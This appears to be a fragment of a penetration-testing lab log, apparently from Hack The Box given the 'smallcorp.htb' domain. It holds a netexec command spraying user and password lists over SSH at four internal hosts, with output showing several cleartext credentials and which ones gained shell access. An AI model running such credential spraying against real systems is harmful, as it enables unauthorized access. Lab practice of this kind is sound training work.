```rust
 netexec ssh ips.txt -u users.txt -p passwords.txt
SSH         192.168.1.19    22     192.168.1.19     [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
SSH         192.168.1.11    22     192.168.1.11     [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
SSH         192.168.1.23    22     192.168.1.23     [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
SSH         192.168.1.13    22     192.168.1.13     [*] SSH-2.0-OpenSSH_8.0
SSH         192.168.1.19    22     192.168.1.19     [-] jennifer:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] gkaufmann:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] jennifer:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] gkaufmann@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] jwallace@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] jwallace:Ibanezsz@1
SSH         192.168.1.19    22     192.168.1.19     [-] jennifer:eelahX8F!
SSH         192.168.1.19    22     192.168.1.19     [-] gkaufmann:eelahX8F!
SSH         192.168.1.19    22     192.168.1.19     [-] jennifer:eelahX8F!
SSH         192.168.1.19    22     192.168.1.19     [-] gkaufmann@orion.smallcorp.htb:eelahX8F!
SSH         192.168.1.19    22     192.168.1.19     [-] jwallace@orion.smallcorp.htb:eelahX8F!
SSH         192.168.1.19    22     192.168.1.19     [-] jwallace:eelahX8F!
SSH         192.168.1.13    22     192.168.1.13     [+] jennifer:Ibanezsz@1  Linux - Shell access!
SSH         192.168.1.11    22     192.168.1.11     [-] jennifer:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] gkaufmann:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] jennifer:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] gkaufmann@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] jwallace@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] jwallace:Ibanezsz@1
SSH         192.168.1.11    22     192.168.1.11     [-] jennifer:eelahX8F!
SSH         192.168.1.11    22     192.168.1.11     [-] gkaufmann:eelahX8F!
SSH         192.168.1.11    22     192.168.1.11     [-] jennifer:eelahX8F!
SSH         192.168.1.11    22     192.168.1.11     [+] gkaufmann@orion.smallcorp.htb:eelahX8F!  Linux - Shell access!
SSH         192.168.1.23    22     192.168.1.23     [-] jennifer:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] gkaufmann:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] jennifer:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] gkaufmann@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] jwallace@orion.smallcorp.htb:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] jwallace:Ibanezsz@1
SSH         192.168.1.23    22     192.168.1.23     [-] jennifer:eelahX8F!
SSH         192.168.1.23    22     192.168.1.23     [-] gkaufmann:eelahX8F!
SSH         192.168.1.23    22     192.168.1.23     [-] jennifer:eelahX8F!
SSH         192.168.1.23    22     192.168.1.23     [+] gkaufmann@orion.smallcorp.htb:eelahX8F!  Linux - Shell access!
```

